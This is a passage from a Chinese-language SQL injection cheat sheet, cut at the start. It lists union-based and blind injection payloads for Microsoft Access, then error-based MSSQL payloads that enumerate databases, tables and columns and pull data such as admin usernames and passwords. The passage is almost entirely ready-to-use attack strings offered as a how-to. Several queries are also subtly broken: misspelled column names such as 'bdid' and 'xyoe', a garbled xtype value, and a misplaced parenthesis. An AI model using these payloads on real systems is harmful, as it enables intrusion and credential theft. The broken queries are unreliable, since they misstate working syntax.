and exists(select username from admin) /*username为列名,让你猜列名*/
order by 8 /*猜解字段长度*/
将id改为0 union select 1,2,3,4,5,6,7,8 from admin /*获取位置*/
union select 1,username,password,4,5,6,7,8 from admin /*读字段*/
```

ACCESS盲注:
```sql
判断是否有注入就不说了
and exists(select * from msysobjects) /*500状态码或报无权限读取代表是Access数据库*/
and exists(select * from admin) /*admin是你要猜解的表名*/
and exists(select username from admin) /*username是你要猜解的列名*/
and (select top 1 len(username) from admin)>1 /*top 1 len(你要猜解列名的长度),1代表长度,直到报错的第一个*/
例子：
and (select top1 len(username) from admin)>4 /*正确*/
and (select top 1 len(username) from admin)>5 /*错误*/ 那么长度为5，第一个错误就是长度

and(select top 1 asc(mid(username,1,1)) from admin)=97 /*username为你要猜解的列名，1为长度，如果上一步为5这里最高是5,97位ascii码,通过ascii来猜解字段*/

```

MSSQL注入
```sql
mssql是sql server，也是微软推出的大型数据库。

MSSQL权限:
sa权限:数据库管理，文件管理，命令执行，注册表，system

db权限:文件管理，数据库操作等，users-administrators

public权限:
数据库操作， guest-users


注入语句:
判断有没有注入
'
and 1=1
and 1=2
初步判断是否mssql
and user>0
判断数据库系统
and (select count(*)from sysobjects)>0 //mssql
注释:诺是报错或者权限不足无法查看就是mssql数据库了

查看数据库版本信息：and 1=(select @@version)
查看数据库的语句：and 1=(select db_name())
获取第一个用户数据库：and 1=(select top 1 name from master..sysdatabases where bdid>4)
获取下一个数据库：and 1=(select top 1 name from master ..sysdatabases where bdid>4 and name<>'数据库名') //以此类推可以获取全部数据库名

获取表：and 1=(select top 1 name from sysobjects where xtype='u'
获取第二张表: and 1=(select top 1 name from sysobjects where xype='||' and name <> '第一张表名')
获取第三张表：and 1=(select top 1 name from sysobjects where xyoe='||' and name <> '第一张表名' and name <> '第二张表名')
获取N张表以此类推可以获取所有表。。。

获取某表的列名：and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='表名'))
获取第二个列名：and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='表名')) and name <> '第一个列名'
获取N个列名以此类推可以获取所有列名。。。

获取列里面的数据：and 1=(select top 1 列名 from 表名 )
要查询其他的改为对应的就ok
```
